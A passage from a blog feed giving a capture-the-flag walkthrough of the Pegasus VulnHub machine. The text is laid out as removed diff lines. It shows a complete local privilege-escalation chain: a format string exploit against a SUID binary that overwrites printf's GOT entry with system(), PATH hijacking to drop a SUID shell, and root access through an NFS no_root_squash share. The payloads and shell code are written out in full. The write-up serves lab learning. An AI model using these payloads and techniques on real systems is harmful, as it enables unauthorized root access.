- * Documentation:  https://help.ubuntu.com/
-
-  System information as of Tue Dec 23 20:36:47 AEDT 2014
-
-  System load:  0.0               Processes:           93
-  Usage of /:   6.8% of 18.32GB   Users logged in:     0
-  Memory usage: 12%               IP address for eth0: 192.168.56.101
-  Swap usage:   0%
-
-  =&amp;gt; There are 2 zombie processes.
-
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
-
-
-Your Hardware Enablement Stack (HWE) is supported until April 2017.
-
-You have mail.
-Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
-mike@pegasus:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;my-first-your-first-we-all-first&#34;&gt;my_first, your_first, we_all_first&lt;/h2&gt;
-
-&lt;p&gt;With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s home (we will get to it shortly):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ls -lh
-total 16K
--rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
-drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
--rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;More enumeration revealed that &lt;code&gt;/opt/&lt;/code&gt; had a number of interesting parts to it as well:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ls -lh /opt/
-total 12K
-drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
-drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
-drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Piecing the web interface together, you will see that the submitted source is put into &lt;code&gt;code.c&lt;/code&gt; in &lt;code&gt;/opt/code_review/&lt;/code&gt;, and then compiled from the script in &lt;code&gt;/home/mike/check_code.sh&lt;/code&gt; and eventually executed.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;/opt/git/&lt;/code&gt; folder had what looked like remnants of the typical &lt;code&gt;.git/&lt;/code&gt; folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the &lt;code&gt;main.c&lt;/code&gt; file from the git history.&lt;/p&gt;
-
-&lt;h3 id=&#34;rebuilding-main-c&#34;&gt;rebuilding main.c&lt;/h3&gt;
-
-&lt;p&gt;&lt;em&gt;This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:/opt/git/my_first.git$ git log
-commit 85365946a8142c52ee6040a029dd069b514c2ab0
-Author: Mike Ross &amp;lt;mike@pegasus.(none)&amp;gt;
-Date:   Tue Nov 25 04:48:01 2014 +1100
-
-    Committing some security fixes
-
-commit 0a8af1ed956518ec078b152ad7571105e2df26c6
-Author: John Wall &amp;lt;john@pegasus.(none)&amp;gt;
-Date:   Tue Nov 25 04:39:42 2014 +1100
-
-    initial commit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;From the log we can see that there as an initial commit, and one more after that with some &lt;em&gt;security fixes&lt;/em&gt;. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit &lt;em&gt;0a8af1ed&lt;/em&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
-commit 0a8af1ed956518ec078b152ad7571105e2df26c6
-Author: John Wall &amp;lt;john@pegasus.(none)&amp;gt;
-Date:   Tue Nov 25 04:39:42 2014 +1100
-
-    initial commit
-
-diff --git a/main.c b/main.c
-new file mode 100644
-index 0000000..39c0182
---- /dev/null
-+++ b/main.c
-@@ -0,0 +1,133 @@
-+#include &amp;lt;stdio.h&amp;gt;
-+#include &amp;lt;stdlib.h&amp;gt;
-+
-+int calculator();
-+int string_replay();
-+int string_reverse();
-+int quit();
-+
-+int main()
-+{
-+    char selection[5];
-+    int sel;
-+    char * err_check;
-
-[... snip ...]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nice! We have a file &lt;code&gt;main.c&lt;/code&gt; that was added. I copied the diff and saved it to &lt;code&gt;init.patch&lt;/code&gt;, and then ran the patch:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# patch -p1 &amp;lt; init.diff
-patching file main.c
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;That gives us the state of files after commit &lt;em&gt;0a8af1ed&lt;/em&gt; which was labeled as the initial commit. The same process was followed for the next commit &lt;em&gt;85365946a8&lt;/em&gt; which apparently included some &lt;em&gt;security fixes&lt;/em&gt;. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.&lt;/p&gt;
-
-&lt;p&gt;I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/main.c b/main.c
-index 39c0182..b6b2ed4 100644
---- a/main.c
-+++ b/main.c
-@@ -8,7 +8,7 @@ int quit();
-
-[... snip ...]
-+
-         printf(&amp;quot;Enter second number: &amp;quot;);
-         if (fgets(numberB, sizeof numberB, stdin) != NULL)
-         {
--            int numA = strtol(numberA, &amp;amp;err_check, 10);
-             int numB = strtol(numberB, &amp;amp;err_check, 10);
-             if (*err_check != &#39;\n&#39;)
-             {
--                printf(&amp;quot;Error details: &amp;quot;);
--                printf(err_check);
-+                printf(&amp;quot;Error details: %s&amp;quot;, err_check);
-                 printf(&amp;quot;\n&amp;quot;);
-                 return 1;
-[... snip ...]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;printf(err_check);&lt;/code&gt; is the potentially vulnerable call&amp;hellip; I think.&lt;/p&gt;
-
-&lt;h3 id=&#34;the-calculator-with-a-hole&#34;&gt;the calculator with a hole&lt;/h3&gt;
-
-&lt;p&gt;After toying with the git repository, my attention turned back to the SUID binary. When I run &lt;code&gt;my_first&lt;/code&gt;, I am actually running it as &lt;code&gt;john&lt;/code&gt;. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s privileges! Sounds easy right. :P&lt;/p&gt;
-
-&lt;p&gt;I quickly realized that the &lt;code&gt;main.c&lt;/code&gt; file I got out of the git repository, was the sources for the &lt;code&gt;my_first&lt;/code&gt; binary. So, my focus shifted to the piece of code I saw the security fix for.&lt;/p&gt;
-
-&lt;p&gt;First, it was time to confirm my suspicion of a format string vulnerability:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ./my_first
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection: 1
-
-Enter first number: 1
-Enter second number: %x
-Error details: bf96cbec
-
-Selection:
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.&lt;/p&gt;
-
-&lt;p&gt;Anyways, feels aside, it was time to work on a exploit.&lt;/p&gt;
-
-&lt;p&gt;For the format string exploit, I don&amp;rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about &lt;a href=&#34;https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/&#34;&gt;Xerxes2&lt;/a&gt; which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt; I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. &lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/14960.js&#34; id=&#34;asciicast-14960&#34; async data-theme=&#34;solarized-dark&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;punching-more-than-numbers&#34;&gt;punching more than numbers&lt;/h3&gt;
-
-&lt;p&gt;&lt;em&gt;So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to &lt;code&gt;my_first&lt;/code&gt;&amp;rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for subtly pointing the fail out ;p&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for &lt;code&gt;printf()&lt;/code&gt; using the format string to &lt;code&gt;system()&lt;/code&gt; instead. This means, the next time &lt;code&gt;printf()&lt;/code&gt; is called, it would actually execute &lt;code&gt;system()&lt;/code&gt; with the adjacent argument on the stack. Lets see how this was done.&lt;/p&gt;
-
-&lt;h4 id=&#34;compiling-the-format-string&#34;&gt;compiling the format string&lt;/h4&gt;
-
-&lt;p&gt;We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the &lt;code&gt;./my_first&lt;/code&gt; binary to sample a successful run:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\n1\n4\n&#39; | ./my_first
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Result: 1 + 1 = 2
-
-Selection:
-Goodbye!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&amp;rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&amp;rsquo;s. In my case, I will be formatting them as hex with &lt;code&gt;%x&lt;/code&gt;, so I am searching for &lt;code&gt;41414141&lt;/code&gt;. The format string will therefore start as &lt;code&gt;AAAA.0x%s&lt;/code&gt;. Note that in the below example we are using 2 x percentages (2 x &amp;lsquo;%&amp;rsquo;) as it needs to be escaped in the shell:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%x\n4\n&#39; | ./my_first
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Error details: AAAA.0xbff5321c
-
-Selection:
-Goodbye!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And we have the output of &lt;code&gt;AAAA.0xbff5321c&lt;/code&gt;. Yay :)
-Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&amp;rsquo;s:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39; | ./my_first
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141
-
-Selection:
-Goodbye!
-mike@pegasus:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So, using direct parameter access in the format string, we can reference parameter 8 directly:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%8$x\n4\n&#39; | ./my_first
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Error details: AAAA.0x41414141
-
-Selection:
-Goodbye!
-mike@pegasus:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output &lt;code&gt;AAAA.0x41414141&lt;/code&gt; of the format string &lt;code&gt;AAAA.0x%8$x&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Now we will move on to making use of the &lt;code&gt;%n&lt;/code&gt; format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for &lt;code&gt;printf()&lt;/code&gt; occurs ofc! Lets dump the GOT for &lt;code&gt;./my_first&lt;/code&gt;, and determine where it will go look for &lt;code&gt;printf()&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ objdump -R ./my_first
-
-./my_first:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049bec R_386_GLOB_DAT    __gmon_start__
-08049c20 R_386_COPY        stdin
-08049bfc R_386_JUMP_SLOT   printf
-08049c00 R_386_JUMP_SLOT   fgets
-08049c04 R_386_JUMP_SLOT   puts
-08049c08 R_386_JUMP_SLOT   __gmon_start__
-08049c0c R_386_JUMP_SLOT   __libc_start_main
-08049c10 R_386_JUMP_SLOT   putchar
-08049c14 R_386_JUMP_SLOT   strtol
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The location of &lt;code&gt;printf()&lt;/code&gt; will be looked up at &lt;code&gt;08049bfc&lt;/code&gt;. This is the part where we want to rewrite the address of &lt;code&gt;printf()&lt;/code&gt; to that of libc&amp;rsquo;s &lt;code&gt;system()&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;The last part we need is to know where &lt;code&gt;system()&lt;/code&gt; actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of &lt;code&gt;system()&lt;/code&gt; to be different every time &lt;code&gt;./my_first&lt;/code&gt; is run. To combat this, a neat little trick to increase the stack size can be used using &lt;code&gt;ulimit&lt;/code&gt;. &lt;code&gt;ulimit -s unlimited&lt;/code&gt; will maximize the stack size, effectively causing the ASLR to be practically nonexistent:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ulimit -s
-8192
-mike@pegasus:~$ ulimit -s unlimited
-mike@pegasus:~$ ulimit -s
-unlimited
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;With the ASLR problem out of the way, lets leak the address of &lt;code&gt;system()&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# fire up gdb
-mike@pegasus:~$ gdb -q ./my_first
-Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
-
-# set a break point as we enter main()
-(gdb) b main
-Breakpoint 1 at 0x804850f
-
-# run the binary
-(gdb) r
-Starting program: /home/mike/my_first
-
-Breakpoint 1, 0x0804850f in main ()
-
-# leak the current address of system()
-(gdb) p system
-$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And so we learn that &lt;code&gt;system()&lt;/code&gt; lives at &lt;code&gt;0x40069060&lt;/code&gt;. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using &lt;code&gt;%n&lt;/code&gt;) a new address for &lt;code&gt;printf()&lt;/code&gt; in the GOT at &lt;code&gt;08049bfc&lt;/code&gt; to point to &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;0x40069060&lt;/code&gt; instead of its real location.&lt;/p&gt;
-
-&lt;p&gt;For us to debug the application while we prepare the required padding for the format string, we will use the &lt;code&gt;printf()&lt;/code&gt; used to pipe to &lt;code&gt;./my_first&lt;/code&gt; to redirect to a file instead. Then, in &lt;code&gt;gdb&lt;/code&gt;, we will run the binary, redirecting the input from the file we will compile with the &lt;code&gt;printf()&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# so, instead of the 4 x A&#39;s, we will now place the address
-# in the GOT that we want to override, and use the %x format
-# string to attempt writing to it
-mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39; &amp;gt; t
-mike@pegasus:~$ file t
-t: data
-
-# then, in gdb, we will grab the output of the new file called
-# t, and redirect it as input to my_first
-mike@pegasus:~$ gdb -q ./my_first
-Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
-
-# leak the current address that GOT points to for printf()
-(gdb) x/x 0x08049bfc
-0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x080483b6
-
-# run the binary with our exploit (t) as input
-(gdb) r &amp;lt; t
-Starting program: /home/mike/my_first &amp;lt; t
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Error details: ��
-
-Program received signal SIGSEGV, Segmentation fault.
-0x00000004 in ?? ()
-
-# inspect the new address the GOT points to for printf()
-(gdb) x/x 0x08049bfc
-0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x00000004
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address &lt;code&gt;0x40069060&lt;/code&gt; instead of &lt;code&gt;0x00000004&lt;/code&gt; written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was &lt;code&gt;\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&lt;/code&gt;, with a run in the debugger ending in:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# prep the input file
-mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39; &amp;gt; t
-mike@pegasus:~$
-
-# run it in the debugger
-(gdb) r &amp;lt;t
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/mike/my_first &amp;lt;t
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Error details: ����
-
-[... snip ...]
-
-sh: 1: Selection:: not found
-
-Program received signal SIGSEGV, Segmentation fault.
-0x08c3f98c in ?? ()
-
-# check where the GOT points to for printf()
-(gdb) x/x 0x08049bfc
-0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x40069060
-
-# confirm system() is still there :)
-(gdb) p system
-$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The binary crashes with &lt;code&gt;sh: 1: Selection:: not found&lt;/code&gt;, meaning that it is now trying to run &lt;code&gt;system(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; instead of &lt;code&gt;printf(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; due to the GOT override.&lt;/p&gt;
-
-&lt;h4 id=&#34;finishing-the-exploit&#34;&gt;finishing the exploit&lt;/h4&gt;
-
-&lt;p&gt;From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get &lt;code&gt;Selection:&lt;/code&gt; to actually mean something, like prepare a small SUID C shell perhaps? :)&lt;/p&gt;
-
-&lt;p&gt;I quickly compiled some C wrapper code to prepare a shell and ran the exploit.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Prep Selection: to make a SUID shell for john
-# and modify PATH
-mike@pegasus:~$ cat tojohn.c
-#include &amp;lt;stdio.h&amp;gt;
-int main()
-{
-    system(&amp;quot;cp /bin/sh /tmp/tojohn&amp;quot;);
-    system(&amp;quot;chmod 4777 /tmp/tojohn&amp;quot;);
-}
-mike@pegasus:~$ gcc tojohn.c -o &amp;quot;Selection:&amp;quot;
-mike@pegasus:~$ export PATH=/home/mike/:$PATH
-
-# run the exploit...
-mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39; | ./my_first
-WELCOME TO MY FIRST TEST PROGRAM
---------------------------------
-Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-
-Selection:
-Enter first number: Enter second number: Error details: ����
-
-                     10
-Segmentation fault (core dumped)
-
-# ... and check /tmp
-mike@pegasus:~$ ls -lah /tmp/
-total 108K
-drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
-drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
--rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
-mike@pegasus:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We have a new file &lt;code&gt;tojohn&lt;/code&gt; in &lt;code&gt;/tmp&lt;/code&gt; :D&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ /tmp/tojohn
-$ id
-uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;hoofing-rooting-pegasus&#34;&gt;hoofing (rooting) Pegasus&lt;/h2&gt;
-
-&lt;p&gt;I added the public key of the keypair I generated for Pegasus to &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s authorized_keys file and proceeded to SSH in as him.&lt;/p&gt;
-
-&lt;p&gt;Quick enumeration showed that &lt;code&gt;mike&lt;/code&gt; is allowed to start the nfs daemon via &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@pegasus:~$ sudo -l
-Matching Defaults entries for john on this host:
-    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-
-User john may run the following commands on this host:
-    (root) NOPASSWD: /usr/local/sbin/nfs
-john@pegasus:~$ sudo nfs
-Usage: nfs [start|stop]
-john@pegasus:~$ sudo nfs start
- * Exporting directories for NFS kernel daemon...                                                                                                                                 [ OK ]
- * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
-john@pegasus:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I checked out the &lt;code&gt;/etc/exports&lt;/code&gt; file, and noticed the the &lt;code&gt;no_root_squash&lt;/code&gt; flag for the &lt;code&gt;/opt/nfs&lt;/code&gt; export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)&lt;/p&gt;
-
-&lt;p&gt;So, I mounted the share&amp;hellip;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# mkdir nfs
-root@kali:~# mount 192.168.56.101:/opt/nfs nfs
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&amp;hellip; prepped a SUID shell &amp;hellip;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/pegasus/nfs# cat shell.c
-#include &amp;lt;stdio.h&amp;gt;
-
-int main()
-{
-    setuid(0);
-    setgid(0);
-    system(&amp;quot;/bin/sh&amp;quot;);
-}
-root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
-root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
-root@kali:~/Desktop/pegasus/nfs# ls -lah
-total 20K
-drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
-drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
--rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
--rw-r--r-- 1 root root   79 Dec 23 14:39 shell.c
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&amp;hellip; and rooted Pegasus :)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@pegasus:~$ /opt/nfs/shell
-# id
-uid=0(root) gid=0(root) groups=0(root),1000(john)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;flag&#34;&gt;flag :)&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag
-               ,
-               |`\
-              /&#39;_/_
-            ,&#39;_/\_/\_                       ,
-          ,&#39;_/\&#39;_\_,/_                    ,&#39;|
-        ,&#39;_/\_&#39;_ \_ \_/                _,-&#39;_/
-      ,&#39;_/&#39;\_&#39;_ \_ \&#39;_,\           _,-&#39;_,-/ \,      Pegasus is one of the best
-    ,&#39; /_\ _&#39;_ \_ \&#39;_,/       __,-&#39;&amp;lt;_,&#39; _,\_,/      known creatures in Greek
-   ( (&#39; )\/(_ \_ \&#39;_,\   __--&#39; _,-_/_,-&#39;,_/ _\      mythology. He is a winged
-    \_`\&amp;gt; 6` 7  \&#39;_,/ ,-&#39; _,-,&#39;\,_&#39;_ \,_/&#39;_,\       stallion usually depicted
-     \/-  _/ 7 &#39;/ _,&#39; _/&#39;\_  \,_&#39;_ \_ \&#39;_,/         as pure white in color.
-      \_&#39;/&amp;gt;   7&#39;_/&#39; _/&#39; \_ &#39;\,_&#39;_ \_ \&#39;_,\          Symbol of wisdom and fame.
-        &amp;gt;/  _ ,V  ,&amp;lt;  \__ &#39;\,_&#39;_ \_ \&#39;_,/
-      /&#39;_  ( )_)\/-,&#39;,__ &#39;\,_&#39;_,\_,\&#39;_\             Fun fact: Pegasus was also
-     ( ) \_ \|_  `\_    \_,/&#39;\,_&#39;_,/&#39;               a video game system sold in
-      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
-       \_)   &amp;gt;        `\_                           It was a hardware clone of
-            /  `,      |`\_                         the Nintendo Famicom.
-           /    \     / \ `\
-          /   __/|   /  /  `\
-         (`  (   (` (_  \   /
-         /  ,/    |  /  /   \
-        / ,/      | /   \   `\_
-      _/_/        |/    /__/,_/
-     /_(         /_(
-
-
-CONGRATULATIONS! You made it :)
-
-Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
-learnt a thing or two while doing it! :)
-
-Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
-providing first review.
-
-Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
-and leave some feedback, I would love to hear from you!
-
-Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
-more awesome boot2root VMs!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for the fun &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;&lt;/p&gt;</description>
     </item>
     
   </channel>
